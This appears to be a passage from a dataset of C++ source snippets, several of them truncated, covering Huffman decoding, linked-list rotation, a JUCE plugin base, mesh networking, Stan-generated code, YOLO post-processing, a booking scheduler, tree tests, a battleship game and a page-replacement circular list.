codeLengthArr[0];\n\t\tchar codeArr[64]; // FIXME: \u043d\u0443\u0436\u043d\u043e \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u0435\u0441\u043a\u0438 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0442\u044c \u0440\u0430\u0437\u043c\u0435\u0440\n\t\tin.read(codeArr, codeLength);\n\t\tcodeArr[codeLength] = '\\0';\n\t\tstring code = codeArr;\n\t\thaffmanTable[symbol] = code;\n\t}\n}\n\nvoid DeserializeHaffmanText(ifstream& in) {\n\tunsigned char byte;\n\twhile (true) {\n\t\tchar byteArr[1];\n\t\tin.read(byteArr, 1);\n\t\tbyte = byteArr[0];\n\t\tauto s = in.tellg();\n\t\tif (in.peek() == EOF) {\n\t\t\tint extraZerosVol = byte;\n\t\t\tstring rightLastByte = haffmanText.substr(haffmanText.size() - (8 - extraZerosVol), 8 - extraZerosVol);\n\t\t\thaffmanText.replace(haffmanText.size() - 8, 8, rightLastByte);\n\t\t\tbreak;\n\t\t}\n\t\thaffmanText += bitset<8> { byte }.to_stri",
    "/*\nOnce upon a time, there was a company called \"Circular Solutions Inc.\" that specialized in manufacturing circular shaped products. One day, the company decided to create a new product - a linked list. The product was a great success, and the company started receiving orders from all over the world.\n\n\nHowever, the CEO of the company realized that the customers wanted to have the ability to rotate the linked list A to the right by B places. The CEO tasked the engineering team to develop a solution for this problem.\n\n\nThe engineering team worked hard and came up with an algorithm that could rotate the linked list to the right by B places. Can you implement the algorithm?\n\n A = 1 -> 2 -> 3 -> 4 -> 5 -> NULL \n\n B = 2 \n\n    -> B nodes aage chahiye yani size - B nodes baad me aayenge\n    -> for (int i = 0; i < size - 1 - B; i++) \n\n  4 5 1 2 3\n\n*/\n\n#include <bits/stdc++.h>\nusing namespace std;\n\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode(int x) : val(x), next(NULL) {}\n};\n\nListNode* solve(ListNode* A, int B) {\n    int size = 0;\n    ListNode *curr = A;\n    while (curr != NULL) {\n        curr = curr->next;\n        size++;\n    }\n\n    if (size == 1) return A;\n    B = B % size;\n\n    curr = A;\n    for (int i = 0; i < size - 1 - B; i++) {\n        curr = curr->next;\n    }\n\n    ListNode *next = curr->next;\n    curr->next = NULL;\n\n    curr = next;\n    while (curr != NULL && curr->next != NULL) {\n        curr = curr->next;\n    }\n\n    if (curr != NULL)\n        curr->next = A;\n\n    return next;\n}\n\nint main() {\n    \n    return 0;\n}",
    "/*\nCreated by:  Nathan Blair\nLast Edited: April 19, 2022\n\n-> Base class for the JUCE audio processor that interacts the host\n*/\n\n#include \"PluginProcessorBase.h\"\n\n//==============================================================================\nPluginProcessorBase::PluginProcessorBase()\n     : AudioProcessor (BusesProperties()\n                     #if ! JucePlugin_IsMidiEffect\n                      #if ! JucePlugin_IsSynth\n                       .withInput  (\"Input\",  juce::AudioChannelSet::stereo(), true)\n                      #endif\n                      #if NEEDS_SIDECHAIN\n                       .withInput  (\"Sidechain\",  juce::AudioChannelSet::stereo(), true)\n                      #endif\n                       .withOutput (\"Output\", juce::AudioChannelSet::stereo(), true)\n                     #endif\n                       )\n{\n}\n\nPluginProcessorBase::~PluginProcessorBase()\n{\n}\n\n//==============================================================================\nconst juce::String PluginProcessorBase::getName() const\n{\n    return JucePlugin_Name;\n}\n\nbool PluginProcessorBase::acceptsMidi() const\n{\n   #if JucePlugin_WantsMidiInput\n    return true;\n   #else\n    return false;\n   #endif\n}\n\nbool PluginProcessorBase::producesMidi() const\n{\n   #if JucePlugin_ProducesMidiOutput\n    return true;\n   #else\n    return false;\n   #endif\n}\n\nbool PluginProcessorBase::isMidiEffect() const\n{\n   #if JucePlugin_IsMidiEffect\n    return true;\n   #else\n    return false;\n   #endif\n}\n\ndouble PluginProcessorBase::getTailLengthSeconds() const\n{\n    return 10.0;\n}\n\nint PluginProcessorBase::getNumPrograms()\n{\n    return 1;   // NB: some hosts don't cope very well if you tell them there are 0 programs,\n                // so this should be at least 1, even if you're not really implementing programs.\n}\n\nint PluginProcessorBase::getCurrentProgram()\n{\n    return 0;\n}\n\nvoid PluginProcessorBase::setCurrentProgram (int index)\n{\n    juce::ignoreUnused (index);\n}\n\nconst juce::String PluginProcessorBase::getProgramName (int index)\n{\n    juce::ignoreUnused (index);\n    return {};\n}\n\nvoid PluginProcessorBase::changeProgramName (int index, const juce::String& newName)\n{\n    juce::ignoreUnused (index, newName);\n}\n\n\nvoid PluginProcessorBase::releaseResources()\n{\n    // When playback stops, you can use this as an opportunity to free up any\n    // spare memory, etc.\n}\n\nbool PluginProcessorBase::isBusesLayoutSupported (const BusesLayout& layouts) const\n{\n  #if JucePlugin_IsMidiEffect\n    juce::ignoreUnused (layouts);\n    return true;\n  #else\n    // This is the place where you check if the layout is supported.\n    // In this template code we only support mono or stereo.\n    // Some plugin hosts, such as certain GarageBand versions, will only\n    // load plugins that support stereo bus layouts.\n    if (layouts.getMainOutputChannelSet() != juce::AudioChannelSet::mono()\n     && layouts.getMainOutputChannelSet() != juce::AudioChannelSet::stereo())\n        return false;\n\n    // This checks if the input layout matches the output layout\n   #if ! JucePlugin_IsSynth\n    #if NEEDS_SIDECHAIN\n        if (layouts.getChannelSet(true, 1) != layouts.getMainInputChannelSet()) {\n            return false;\n        }\n    #endif\n    if (layouts.getMainOutputChannelSet() != layouts.getMainInputChannelSet())\n        return false;\n   #else\n    #if NEEDS_SIDECHAIN\n        if (layouts.getChannelSet(true, 0) != layouts.getMainInputChannelSet()) {\n            return false;\n        }\n    #endif\n   #endif\n\n    return true;\n  #endif\n}\n\n//==============================================================================\nbool PluginProcessorBase::hasEditor() const\n{\n    return true; // (change this to false if you choose to not supply an editor)\n}",
    "#include \"Communication.h\"\n\nScheduler userScheduler; // to control your personal task\npainlessMesh mesh;\nuint32_t Communication::groupNumber = 0;\n\n// User-defined callback function pointer\nvoid (*Communication::userCallback)(String &msg) = nullptr;\n\nvoid Communication::sendMessage(String msg)\n{\n    String data = String(groupNumber) + \"#\" + msg;\n    mesh.sendBroadcast(data);\n}\n\n// Needed for painless library\nvoid Communication::receivedCallback(uint32_t from, String &msg)\n{\n    int separatorIndex = msg.indexOf('#');\n    if (separatorIndex != -1) {\n        String groupNumberStr = msg.substring(0, separatorIndex);\n        uint32_t num = groupNumberStr.toInt();\n        String restOfMsg = msg.substring(separatorIndex + 1);\n\n        Serial.printf(\"startHere: Received from %u groupNumber=%u msg=%s\\n\", from, num, restOfMsg.c_str());\n\n        if (groupNumber != num) return;\n\n        // Execute user-defined callback if it is set\n        if (userCallback) {\n            userCallback(restOfMsg);\n        }\n    }\n}\n\nvoid newConnectionCallback(uint32_t nodeId)\n{\n    Serial.printf(\"--> startHere: New Connection, nodeId = %u\\n\", nodeId);\n}\n\nvoid changedConnectionCallback()\n{\n    Serial.printf(\"Changed connections\\n\");\n}\n\nvoid nodeTimeAdjustedCallback(int32_t offset)\n{\n    Serial.printf(\"Adjusted time %u. Offset = %d\\n\", mesh.getNodeTime(), offset);\n}\n\nvoid vTaskUpdate(void *pvParameters)\n{\n    for (;;)\n    {\n        mesh.update();\n    }\n}\n\nvoid Communication::setGroupNumber(uint32_t number) {\n    groupNumber = number;\n}\n\n// Method to set the user-defined callback function\nvoid Communication::onReceive(void (*callbackFunc)(String &msg))\n{\n    userCallback = callbackFunc;\n}\n\nvoid Communication::begin(void)\n{\n    Serial.begin(115200);\n\n    // mesh.setDebugMsgTypes( ERROR | MESH_STATUS | CONNECTION | SYNC | COMMUNICATION | GENERAL | MSG_TYPES | REMOTE ); // all types on\n    mesh.setDebugMsgTypes(ERROR | STARTUP); // set before init() so that you can see startup messages\n\n    mesh.init(MESH_PREFIX, MESH_PASSWORD, &userScheduler, MESH_PORT);\n    mesh.onReceive(&receivedCallback);\n    mesh.onNewConnection(&newConnectionCallback);\n    mesh.onChangedConnections(&changedConnectionCallback);\n    mesh.onNodeTimeAdjusted(&nodeTimeAdjustedCallback);\n\n    static uint8_t ucParameterToPass;\n    TaskHandle_t xHandle = NULL;\n\n    xTaskCreate(vTaskUpdate, \"vTaskMeshUpdate\", 4096, &ucParameterToPass, tskIDLE_PRIORITY, &xHandle);\n    configASSERT(xHandle);\n};",
    "#ifndef MODELS_HPP\r\n#define MODELS_HPP\r\n#define STAN__SERVICES__COMMAND_HPP\r\n#include <rstan/rstaninc.hpp>\r\n#ifndef USE_STANC3\r\n#define USE_STANC3\r\n#endif\r\n// Code generated by stanc v2.32.2\r\n#include <stan/model/model_header.hpp>\r\nnamespace model69701ee920af__namespace {\r\nusing stan::model::model_base_crtp;\r\nusing namespace stan::math;\r\nstan::math::profile_map profiles__;\r\nstatic constexpr std::array<const char*, 43> locations_array__ =\r\n  {\" (found before start of program)\",\r\n  \" (in 'string', line 12, column 2 to column 12)\",\r\n  \" (in 'string', line 13, column 2 to column 10)\",\r\n  \" (in 'string', line 14, column 2 to column 28)\",\r\n  \" (in 'string', line 15, column 2 to column 28)\",\r\n  \" (in 'string', line 16, column 2 to column 16)\",\r\n  \" (in 'string', line 17, column 2 to column 16)\",\r\n  \" (in 'string', line 18, column 2 to column 14)\",\r\n  \" (in 'string', line 19, column 2 to column 14)\",\r\n  \" (in 'string', line 20, column 2 to column 17)\",\r\n  \" (in 'string', line 24, column 4 to column 59)\",\r\n  \" (in 'string', line 25, column 4 to column 52)\",\r\n  \" (in 'string', line 23, column 17 to line 26, column 3)\",\r\n  \" (in 'string', line 23, column 2 to line 26, column 3)\",\r\n  \" (in 'string', line 28, column 4 to column 35)\",\r\n  \" (in 'string', line 29, column 4 to column 35)\",\r\n  \" (in 'string', line 27, column 16 to line 30, column 3)\",\r\n  \" (in 'string', line 27, column 2 to line 30, column 3)\",\r\n  \" (in 'string', line 32, column 4 to column 102)\",\r\n  \" (in 'string', line 31, column 16 to line 33, column 3)\",\r\n  \" (in 'string', line 31, column 2 to line 33, column 3)\",\r\n  \" (in 'string', line 34, column 2 to column 24)\",\r\n  \" (in 'string', line 35, column 2 to column 22)\",\r\n  \" (in 'string', line 36, column 2 to column 26)\",\r\n  \" (in 'string', line 37, column 2 to column 26)\",\r\n  \" (in 'string', line 38, column 2 to column 30)\",\r\n  \" (in 'string', line 39, column 2 to column 30)\",\r\n  \" (in 'string', line 2, column 2 to column 19)\",\r\n  \" (in 'string', line 3, column 2 to column 19)\",\r\n  \" (in 'string', line 4, column 2 to column 19)\",\r\n  \" (in 'string', line 5, column 29 to column 30)\",\r\n  \" (in 'string', line 5, column 2 to column 32)\",\r\n  \" (in 'string', line 6, column 29 to column 30)\",\r\n  \" (in 'string', line 6, column 2 to column 32)\",\r\n  \" (in 'string', line 7, column 20 to column 21)\",\r\n  \" (in 'string', line 7, column 2 to column 23)\",\r\n  \" (in 'string', line 8, column 20 to column 21)\",\r\n  \" (in 'string', line 8, column 2 to column 23)\",\r\n  \" (in 'string', line 9, column 31 to column 32)\",\r\n  \" (in 'string', line 9, column 2 to column 34)\",\r\n  \" (in 'string', line 16, column 9 to column 10)\",\r\n  \" (in 'string', line 17, column 9 to column 10)\",\r\n  \" (in 'string', line 20, column 10 to column 13)\"};\r\nclass model69701ee920af_ final : public model_base_crtp<model69701ee920af_> {\r\nprivate:\r\n  int K;\r\n  int G;\r\n  int T;\r\n  std::vector<int> h;\r\n  std::vector<int> a;\r\n  std::vector<int> y1;\r\n  std::vector<int> y2;\r\n  std::vector<int> R;\r\n  int c_1dim__;\r\npublic:\r\n  ~model69701ee920af_() {}\r\n  model69701ee920af_(stan::io::var_context& context__, unsigned int\r\n                     random_seed__ = 0, std::ostream* pstream__ = nullptr)\r\n      : model_base_crtp(0) {\r\n    int current_statement__ = 0;\r\n    using local_scalar_t__ = double;\r\n    boost::ecuyer1988 base_rng__ =\r\n      stan::services::util::create_rng(random_seed__, 0);\r\n    // suppress unused var warning\r\n    (void) base_rng__;\r\n    static constexpr const char* function__ =\r\n      \"model69701ee920af__namespace::model69701ee920af_\";\r\n    // suppress unused var warning\r\n    (void) function__;\r\n    local_scalar_t__ DUMMY_VAR__(std::numeric_limits<double>::quiet_NaN());\r\n    // suppress unused var warning\r\n    (void) DUMMY_VAR__;\r\n    try {\r\n      int pos__ = std::numeric_limits<int>::min();\r\n      pos__ = 1;\r\n      current_statement__ = 27;\r\n      context__.validate_dims(\"data initialization\", \"K\", \"int\",\r\n        std::vector<size_t>{});\r\n      K = std::numeric_limits<int>::min();\r\n      current_statement__ = 27;\r\n      K = context__.vals_i(\"K\")[(1 - 1)];\r\n      current_statement__ = 27;\r\n      stan::math::check_greater_or_equal(function__, \"K\", K, 2);\r\n      current_statement__ = 28;\r\n      context__.validate_dims(\"data initialization\", \"G\", \"int\",\r\n        std::vector<size_t>{});\r\n      G = std::numeric_limits<int>::min();\r\n      current_statement__ = 28;\r\n      G = context__.vals_i(\"G\")[(1 - 1)];\r\n      current_statement__ = 28;\r\n      stan::math::check_greater_or_equal(function__, \"G\", G, 1);\r\n      current_statement__ = 29;\r\n      context__.validate_dims(\"data initialization\", \"T\", \"int\",\r\n        std::vector<size_t>{});\r\n      T = std::numeric_limits<int>::min();\r\n      current_statement__ = 29;\r\n      T = context__.vals_i(\"T\")[(1 - 1)];\r\n      current_statement__ = 29;\r\n      stan::math::check_greater_or_equal(function__, \"T\", T, 1);\r\n      current_statement__ = 30;\r\n      stan::math::validate_non_negative_index(\"h\", \"G\", G);\r\n      current_stateme",
    "// Copyright (c) 2021 by Rockchip Electronics Co., Ltd. All Rights Reserved.\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// Modified by Q-engineering 4-6-2026\n//\n\n#include <math.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/time.h>\n#include <set>\n#include <vector>\n#include \"rk_common.h\"\n\nstatic float CalculateOverlap(float xmin0, float ymin0, float xmax0, float ymax0, float xmin1, float ymin1, float xmax1,\n                              float ymax1)\n{\n    float w = fmax(0.f, fmin(xmax0, xmax1) - fmax(xmin0, xmin1) + 1.0);\n    float h = fmax(0.f, fmin(ymax0, ymax1) - fmax(ymin0, ymin1) + 1.0);\n    float i = w * h;\n    float u = (xmax0 - xmin0 + 1.0) * (ymax0 - ymin0 + 1.0) + (xmax1 - xmin1 + 1.0) * (ymax1 - ymin1 + 1.0) - i;\n    return u <= 0.f ? 0.f : (i / u);\n}\n\nstatic int nms(int validCount, std::vector<float> &outputLocations, std::vector<int> classIds, std::vector<int> &order,\n               int filterId, float threshold)\n{\n    for (int i = 0; i < validCount; ++i)\n    {\n        if (order[i] == -1 || classIds[i] != filterId)\n        {\n            continue;\n        }\n        int n = order[i];\n        for (int j = i + 1; j < validCount; ++j)\n        {\n            int m = order[j];\n            if (m == -1 || classIds[i] != filterId)\n            {\n                continue;\n            }\n            float xmin0 = outputLocations[n * 4 + 0];\n            float ymin0 = outputLocations[n * 4 + 1];\n            float xmax0 = outputLocations[n * 4 + 0] + outputLocations[n * 4 + 2];\n            float ymax0 = outputLocations[n * 4 + 1] + outputLocations[n * 4 + 3];\n\n            float xmin1 = outputLocations[m * 4 + 0];\n            float ymin1 = outputLocations[m * 4 + 1];\n            float xmax1 = outputLocations[m * 4 + 0] + outputLocations[m * 4 + 2];\n            float ymax1 = outputLocations[m * 4 + 1] + outputLocations[m * 4 + 3];\n\n            float iou = CalculateOverlap(xmin0, ymin0, xmax0, ymax0, xmin1, ymin1, xmax1, ymax1);\n\n            if (iou > threshold)\n            {\n                order[j] = -1;\n            }\n        }\n    }\n    return 0;\n}\n\nstatic int quick_sort_indice_inverse(std::vector<float> &input, int left, int right, std::vector<int> &indices)\n{\n    float key;\n    int key_index;\n    int low = left;\n    int high = right;\n    if (left < right)\n    {\n        key_index = indices[left];\n        key = input[left];\n        while (low < high)\n        {\n            while (low < high && input[high] <= key)\n            {\n                high--;\n            }\n            input[low] = input[high];\n            indices[low] = indices[high];\n            while (low < high && input[low] >= key)\n            {\n                low++;\n            }\n            input[high] = input[low];\n            indices[high] = indices[low];\n        }\n        input[low] = key;\n        indices[low] = key_index;\n        quick_sort_indice_inverse(input, left, low - 1, indices);\n        quick_sort_indice_inverse(input, low + 1, right, indices);\n    }\n    return low;\n}\n\ninline static int32_t __clip(float val, float min, float max)\n{\n    float f = val <= min ? min : (val >= max ? max : val);\n    return f;\n}\n\nstatic int8_t qnt_f32_to_affine(float f32, int32_t zp, float scale)\n{\n    float dst_val = (f32 / scale) + zp;\n    int8_t res = (int8_t)__clip(dst_val, -128, 127);\n    return res;\n}\n\nstatic float deqnt_affine_to_f32(int8_t qnt, int32_t zp, float scale) { return ((float)qnt - (float)zp) * scale; }\n\nstatic void compute_dfl(float* tensor, int dfl_len, float* box){\n    for (int b=0; b<4; b++){\n        float exp_t[dfl_len];\n        float exp_sum=0;\n        float acc_sum=0;\n        for (int i=0; i< dfl_len; i++){\n            exp_t[i] = exp(tensor[i+b*dfl_len]);\n            exp_sum += exp_t[i];\n        }\n\n        for (int i=0; i< dfl_len; i++){\n            acc_sum += exp_t[i]/exp_sum *i;\n        }\n        box[b] = acc_sum;\n    }\n}\n\nstatic int process_i8(int8_t *box_tensor, int32_t box_zp, float box_scale,\n                      int8_t *score_tensor, int32_t score_zp, float score_scale,\n                      int8_t *score_sum_tensor, int32_t score_sum_zp, float score_sum_scale,\n                      int grid_h, int grid_w, int stride, int dfl_len,\n                      std::vector<float> &boxes,\n                      std::vector<float> &objProbs,\n                      std::vector<int> &classId,\n                      float threshold)\n{\n    int validCount = 0;\n    int grid_len = grid_h * gri",
    "#pragma once\n#include <vector>\n#include <stdexcept>\n#include <algorithm>\n#include \"Schedule.cpp\"\n#include \"MailSender.cpp\"\n#include \"SmsSender.cpp\"\n\nusing std::vector;\n\nclass BookingScheduler {\npublic:\n    BookingScheduler(int capacityPerHour) :\n        capacityPerHour{ capacityPerHour } {\n        smsSender = new SmsSender();\n        mailSender = new MailSender();\n    }\n\n    void addSchedule(Schedule* schedule) {\n\n        // \uc815\uac01\uc5d0 \uc608\uc57d\ud558\uc9c0 \uc54a\uc744 \uacbd\uc6b0 RuntimeException \ubc1c\uc0dd\n        if (schedule->getDateTime().tm_min != 0) {\n            throw std::runtime_error(\"Booking should be on the hour.\");\n        }\n\n        // \uc2dc\uac04\ub2f9 \uc608\uc57d\uc778\uc6d0\uc744 \ucd08\uacfc\ud560 \uacbd\uc6b0 RuntimeException \ubc1c\uc0dd\n        int numberOfPeople = schedule->getNumberOfPeople();\n        for (Schedule* bookedSchedule : schedules) {\n            if (isSameTime(bookedSchedule->getDateTime(), schedule->getDateTime())) {\n                numberOfPeople += bookedSchedule->getNumberOfPeople();\n            }\n        }\n        if (numberOfPeople > capacityPerHour) {\n            throw std::runtime_error(\"Number of people is over restaurant capacity per hour\");\n        }\n\n        // \uc77c\uc694\uc77c\uc5d0\ub294 \uc2dc\uc2a4\ud15c\uc744 \uc624\ud508\ud558\uc9c0 \uc54a\ub294\ub2e4.\n        time_t now = getNow();\n        if (getDayOfWeek(now) == \"Sunday\") {\n            throw std::runtime_error(\"Booking system is not available on sunday\");\n        }\n\n        schedules.push_back(schedule);\n\n        // \uace0\uac1d\uc5d0\uac8c SMS \ubc1c\uc1a1\n        smsSender->send(schedule);\n        // \uace0\uac1d\uc774 E Mail\uc744 \uac00\uc9c0\uace0 \uc788\uc744 \uacbd\uc6b0 E Mail \ubc1c\uc1a1\n        if (schedule->getCustomer().getEmail() != \"\") {\n            mailSender->sendMail(schedule);\n        }\n    }\n\n    virtual time_t getNow()\n    {\n        return time(nullptr);\n    }\n\n    bool hasSchedule(Schedule* schedule) {\n        //check if an element exists in array\n        return std::find(schedules.begin(), schedules.end(), schedule) != schedules.end();\n    }\n\n    void setSmsSender(SmsSender* smsSender) {\n        this->smsSender = smsSender;\n    }\n\n    void setMailSender(MailSender* mailSender) {\n        this->mailSender = mailSender;\n    }\n\nprivate:\n    //\ub450 \uc2dc\uac04\uc774 \uac19\uc740\uc9c0 \ud655\uc778\n    bool isSameTime(tm a, tm b) {\n        return mktime(&a) == mktime(&b);\n    }\n\n    //\uc694\uc77c\uc744 \uc54c\ub824\uc8fc\ub294 \ud568\uc218\n    string getDayOfWeek(time_t tm_t) {\n        tm tmTime;\n        localtime_s(&tmTime, &tm_t);\n        char buffer[100] = { 0 };\n        std::strftime(buffer, sizeof(buffer), \"%A\", &tmTime);\n        return string{ buffer };\n    }\n\n    int capacityPerHour;\n    vector<Schedule*> schedules;\n    SmsSender* smsSender;\n    MailSender* mailSender;\n};\n\n\n",
    "#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN\n#include \"doctest.h\"\n#include \"tree.hpp\"\n#include \"complex.hpp\"\n#include <iostream>\n#include <string>\n#include <vector>\n#include <algorithm>\n\n\nTEST_CASE(\"Tree binary with integer\") {\n    tree<int> check_tree(2);\n    check_tree.add_root(1);\n    CHECK(check_tree.getRoot()->value == 1);\n    check_tree.add_sub_node(1, 2);\n    check_tree.add_sub_node(1, 3);\n    Node<int>* root = check_tree.getRoot();\n    CHECK(root->descendence[0]->value == 2);\n    CHECK(root->descendence[1]->value == 3);\n}\n\n\nTEST_CASE(\"Tree with double\") {\n    tree<double> check_tree(3);\n    check_tree.add_root(1.1);\n    check_tree.add_sub_node(1.1, 2.2);\n    check_tree.add_sub_node(1.1, 3.3);\n    Node<double>* root = check_tree.getRoot();\n    CHECK(check_tree.getRoot()->value == 1.1);\n    CHECK(root->descendence[0]->value == 2.2);\n    CHECK(root->descendence[1]->value == 3.3);\n}\n\n\nTEST_CASE(\"Tree with complex\") {\n    tree<Complex> check_tree(3);\n    check_tree.add_root(Complex(1, 1));\n    check_tree.add_sub_node(Complex(1, 1), Complex(2, 2));\n    check_tree.add_sub_node(Complex(1, 1), Complex(3, 3));\n    Node<Complex>* root = check_tree.getRoot();\n    CHECK(check_tree.getRoot()->value == Complex(1, 1));\n    CHECK(root->descendence[0]->value == Complex(2, 2));\n    CHECK(root->descendence[1]->value == Complex(3, 3));\n}\n\nTEST_CASE(\"Tree with integer with 3-children\") {\n    tree<int> check_tree(3);\n    check_tree.add_root(1);\n    CHECK(check_tree.getRoot()->value == 1);\n    check_tree.add_sub_node(1, 2);\n    check_tree.add_sub_node(1, 3);\n    check_tree.add_sub_node(1, 4);\n    Node<int>* root = check_tree.getRoot();\n    CHECK(root->descendence[0]->value == 2);\n    CHECK(root->descendence[1]->value == 3);\n    CHECK(root->descendence[2]->value == 4);\n}\n\n\nTEST_CASE(\"Tree with more k children: error\") {\n    tree<int> check_tree(2);\n    check_tree.add_root(1);\n    check_tree.add_sub_node(1, 2);\n    check_tree.add_sub_node(1, 3);\n    CHECK_THROWS_AS(check_tree.add_sub_node(1, 4), std::runtime_error); \n}\n\nTEST_CASE(\"bfs_iterator for int\") {\n    tree<int> check_tree(3);\n    check_tree.add_root(1);\n    check_tree.add_sub_node(1, 2);\n    check_tree.add_sub_node(1, 3);\n    check_tree.add_sub_node(1, 4);\n    check_tree.add_sub_node(2, 5);\n    check_tree.add_sub_node(2, 6);\n     check_tree.add_sub_node(2, 7);\n\n\n    std::vector<int> vector_result = {1, 2, 3, 4, 5, 6,7};\n    int i = 0;\n    for (auto it = check_tree.begin_bfs_scan(); it != check_tree.end_bfs_scan(); ++it) {\n        CHECK(*it == vector_result[i]);\n        ++i;\n    }\n}\n\n\nTEST_CASE(\"bfs_iterator for double\") {\n    tree<double> check_tree(3);\n    check_tree.add_root(1.1);\n    check_tree.add_sub_node(1.1, 2.2);\n    check_tree.add_sub_node(1.1, 3.3);\n    check_tree.add_sub_node(1.1, 4.4);\n    check_tree.add_sub_node(2.2, 5.5);\n    std::vector<double> vector_result = {1.1, 2.2, 3.3, 4.4, 5.5};\n    int i = 0;\n    for (auto it = check_tree.begin_bfs_scan(); it != check_tree.end_bfs_scan(); ++it) {\n        CHECK(*it == vector_result[i]);\n        ++i;\n    }\n}\n\nTEST_CASE(\"bfs_iterator for Complex\") {\n    tree<Complex> check_tree(3);\n    check_tree.add_root(Complex(1, 1));\n    check_tree.add_sub_node(Complex(1, 1), Complex(2, 2));\n    check_tree.add_sub_node(Complex(1, 1), Complex(3, 3));\n    check_tree.add_sub_node(Complex(1, 1), Complex(4, 4));\n    check_tree.add_sub_node(Complex(2, 2), Complex(5, 5));\n    check_tree.add_sub_node(Complex(3, 3), Complex(6, 6));\n    check_tree.add_sub_node(Complex(3, 3), Complex(7, 7));\n    check_tree.add_sub_node(Complex(3, 3), Complex(8, 8));\n    \n    std::vector<Complex> vector_result = {Complex(1, 1), Complex(2, 2), Complex(3, 3), Complex(4, 4), Complex(5, 5), Complex(6, 6),Complex(7, 7),Complex(8, 8)};\n    int i = 0;\n    for (auto it = check_tree.begin_bfs_scan(); it != check_tree.end_bfs_scan(); ++it) {\n        CHECK(*it == vector_result[i]);\n        ++i;\n    }\n}\n\n\nTEST_CASE(\"dfs_iterator for int\") {\n    tree<int> check_tree(3);\n    check_tree.add_root(1);\n    check_tree.add_sub_node(1, 2);\n    check_tree.add_sub_node(1, 3);\n    check_tree.add_sub_node(1, 4);\n    check_tree.add_sub_node(2, 5);\n    check_tree.add_sub_node(2, 6);\n    check_tree.add_sub_node(2, 7);\n    check_tree.add_sub_node(3, 8);\n    check_tree.add_sub_node(3, 9);\n    check_tree.add_sub_node(4, 10);\n\n    std::vector<int> dfs_order = {1, 2, 5, 6,7, 3,8,9 ,4,10};\n    int i = 0;\n    for (auto it = check_tree.begin_dfs_scan(); it != check_tree.end_dfs_scan(); ++it) {\n        CHECK(*it == dfs_order[i]);\n        ++i;\n    }\n}\n\nTEST_CASE(\"dfs_iterator for double\") {\n    tree<double> check_tree(3);\n    check_tree.add_root(1.1);\n    check_tree.add_sub_node(1.1, 2.2);\n    check_tree.add_sub_node(1.1, 3.3);\n    check_tree.add_sub_node(1.1, 4.4);\n    check_tree.add_sub_node(2.2, 5.5);\n    check_tree.add_sub_node(2.2, 6.6);\n     check_tree.add_sub_node(2.2, 7.7);\n    check_tree.add_sub_node(3.3, 8.8);\n    check_tree.add_sub_node(3.3, 9.9);\n    check_tree.add_sub_node(4.4, 10",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    // We use \"1\" to indicate there is a ship.\r\n\r\n    bool ships[4][4] = \r\n    {\r\n        {0, 1, 1, 0},\r\n        {0, 0, 0, 0},\r\n        {0, 0, 1, 0},\r\n        {0, 0, 1, 0}\r\n    };\r\n\r\n    // Keep track of how many hits the player has and how many turns they have played in these variables\r\n\r\n    int hits = 0;\r\n    int numberOfTurns = 0;\r\n\r\n    // Allow the player to keep going until they have hit all four ships\r\n    while (hits < 4) {\r\n        int row;\r\n        int column;\r\n\r\n        cout << \"Selecting coordinates...\" << endl;\r\n\r\n        // Ask the player for a row\r\n        cout << \"Choose a row number between 0 and 3: \";\r\n        cin >> row;\r\n\r\n        // Ask the player for a column\r\n        cout << \"Choose a column number between 0 and 3: \";\r\n        cin >> column;\r\n\r\n        if (ships[row][column] == 0)\r\n        {\r\n            hits++;\r\n            cout << \"Hit! \" << (4 - hits) << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << \"Miss\\n\\n\";\r\n        }\r\n        numberOfTurns++;\r\n    }\r\n\r\n    cout << \"Victory\" << endl;\r\n    cout << \"You won after \" << numberOfTurns << \" turns\" << endl;\r\n}\r\n",
    "//\r\n// Created by james on 10/24/2023.\r\n//\r\n\r\n#include \"circular_list.h\"\r\n#include \"pagetable.h\"\r\nusing namespace std;\r\n\r\n//\r\n// Created by james on 10/23/2023.\r\n//\r\n\r\n\r\n//circular list structure used by the WSclock\r\n//node\r\n\r\n//CREATES A NEW CIRLIST WITH A FRAME 0\r\nCIRLIST* createCirlist(){\r\n    CIRLIST* newList = new CIRLIST;\r\n    newList->size = 1;\r\n    CIRLISTNODE* headNode = new CIRLISTNODE;\r\n    headNode->pfn = 0;\r\n    headNode->vpn = 0;\r\n    headNode->lastAccessTime = 0;\r\n    headNode->dirty = false;\r\n    headNode->next = headNode;\r\n    newList->head = headNode;\r\n    newList->currentNode = newList->head;\r\n    return newList;\r\n}\r\n\r\n\r\n\r\n\r\n//insert node into the tail of the cirlist\r\nvoid insertTail(CIRLIST* list, CIRLISTNODE* newNode){\r\n    CIRLISTNODE* current = list->head;\r\n\r\n    //traverse so that current points to tail\r\n    while( list->size != 1 && current->next != list->head ){\r\n        current = current->next;\r\n    }\r\n\r\n    //when current->next would be the head, set it to be the new node instead.\r\n   current->next = newNode;\r\n\r\n    //advance to new node, and set its next to be the head\r\n    current = current->next;\r\n    current->next = list->head;//sets new tail node to point to the head\r\n    list->size = list->size + 1;\r\n    return;\r\n}\r\n\r\n\r\n\r\n\r\n\r\n// update list to add a node if pfn isn't found....otherwise updates existing node. For convenience, returns the VPN of the node being updated\r\nvoid updateList(CIRLIST* list, unsigned int vpn, int pfn, int lastAccessTime, bool dirty){\r\n   bool notFound = false;\r\n\r\n    //need to search for node to be updated. start from head\r\n    CIRLISTNODE* current = list->head;\r\n    //find the node to update according to pfn\r\n    while(current->pfn != pfn){\r\n\r\n        if(current->next == list->head){\r\n            notFound = true;\r\n            break;\r\n        }\r\n\r\n        current = current->next;\r\n        //if the list circles around and couldn't find the frame to update....mark notFound and exit loop\r\n    }\r\n\r\n    //add new node\r\n    if(notFound){\r\n        CIRLISTNODE* newNode = new 